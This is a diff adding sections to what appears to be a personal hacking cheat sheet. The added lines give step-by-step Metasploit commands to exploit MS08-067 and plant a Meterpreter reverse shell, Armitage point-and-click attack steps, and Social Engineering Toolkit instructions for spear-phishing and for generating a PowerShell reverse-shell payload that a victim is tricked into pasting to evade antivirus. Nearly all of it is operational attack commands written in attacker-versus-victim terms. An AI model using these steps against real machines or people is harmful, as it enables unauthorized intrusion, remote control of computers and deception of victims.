@@ -352,6 +352,53 @@ nc -h	# Run the help option for the Netcat program to see if it's installed on t
 # The attackers terminal should now have a permanent connection with the target
 
 
+# METERPRETER
+#############
+# This is a very powerful payload that stores itself entirely in memory (writes nothing to disk) and is difficult to detect.
+nmap -sV 192.168.0.107
+	# -sV	# List all services on the Windows machine that will be nmapped
+	# If you see port 445 this is Samba for sharing printers/files across the network.
+service postgresql start
+msfconsole	# Start Metasploit
+	search ms08-067	# This will search for the microsoft Samba exploit in Metasploit
+		# Copy the contents of the "NAME" column. It will look something like:	"exploit/windows/smb/ms08_067_netapi"
+	use exploit/windows/smb/ms08_067_netapi	# Use the exploit found in the last step's search
+	show options	# See what variables you will need to enter
+	set RHOST 192.168.0.107	# Set the remote host IP of the intended victim
+	show payloads	# Show all available payloads for this exploit
+	set payload windows/meterpreter/reverse_tcp	# Select the Meterpreter payload
+	show options
+	set LHOST 192.168.0.109	# Declare the local address to report back to (your local IP)
+	ifconfig	# New Terminal: Confirm your inet addr is accurate. Do this in a different terminal window
+	exploit
+	help	# See the available commands that can be sent to Meterpreter
+	sysinfo	# Grab system info of victim
+	ps	# List all running processes on victim
+		# Find the process ID of a process you want to target. Pick something like explorer.exe that is generally stable or regularly running
+	migrate 1568	# Migrate the process by ID that was chosen in the last step. 1568 will be an example for explorer.exe
+	run checkvm	# Check if victim is a VM or on hardware
+	run winenum	# "Windows Enumerator" fully characterize a windows target. 
+	shell	# Open a terminal shell on the victim's computer. (window's cmd for example)
+		exit	# Exit victim shell and return to yours
+
+
+# ARMITAGE
+##########
+# This is a GUI frontend for the Metasploit framework
+# Official website:	www.fastandeasyhacking.com
+sudo armitage	# begin program - should already be installed with Kali
+	# Accept default connection data on the popup
+	# Click yes on the next few boxes (they're normal)
+#msfdb init	# Run this command if you have errors loading Armitage
+	# armitage will do all of the logging for you. Just check the armitage folder by opening "View > Reporting > Activity Logs" in the GUI menus
+	# Workspaces are also supported by armitage
+	# Right-click on a potential victim and select "Scan" or "MSF Scan" from toolbar menu. All scanning is automated
+	# Click on the "Attacks > Find Attacks" menu option. This generates a custom attack menu per host (victim)
+	# Right-click on the victim again and choose an Attack/Exploit that you want to execute
+	# A menu will popup and allow you to edit variables
+		# Execute with the "Launch" button
+	# "Attacks > Hail Mary" menu feature automates and tests everything it can. Not guaranteed to work but will check almost anything
+	# Once a victim is rooted you can right-click on their name in the menu and begin selecting Meterpreter options
 
 
 # BRUTE FORCE ATTACKING (telnet targets)
@@ -369,7 +416,33 @@ telnet	# This will open a telnet sub-terminal
 # The attempts to brute force will appear in a Wireshark if admins were monitoring during the hack
 
 
-
+# THE SOCIAL ENGINEERING TOOLKIT
+################################
+# Interconnected with Metasploit
+setoolkit	# Open the social engineering toolkit
+	# Spear-Phising is for making fake emails with exploits attached
+	# Tabnabbing replaces session data on an inactive browser tab that links back to attacker
+	# Web Jacking replaces iFrames to make highlighted URL links appear legit
+	# Multi Attack Web select a bunch of the attacks that can be launched at once
+	
+# POWERSHELL ATTACKS
+####################
+# Because PoSh is native to windows - it doesn't trigger antivirus alarms
+setoolkit
+	1	# Select option 1...
+	9
+	1	# It will then ask for your (the attacker's) local IP. use ifconfig if needed
+		# Accept the default port (443) and just press enter
+	yes	# Start the listener
+	# The output will tell you where the viable attacks/commands list is located. It will be something like:
+		# /root/.set/reports/powershell/
+	ls /root/.set/reports/powershell/	# Do this in a new terminal window. Pay attention to the "x86_powershell_" txt file.
+		# Then the victim runs the code in that file, you will have control over their PoSh
+	# Get victim to run that code in PoSh (this is the social-engineering part). Have them copy/paste it in if necessary
+# Meterpreter on the attacker's machine will reflect the new access to powershell
+# In a new terminal running Metasploit, run:
+sessions -i 1	# Reopen your previous session with victim (using ID 1 for example)
+sysinfo
 
 
 
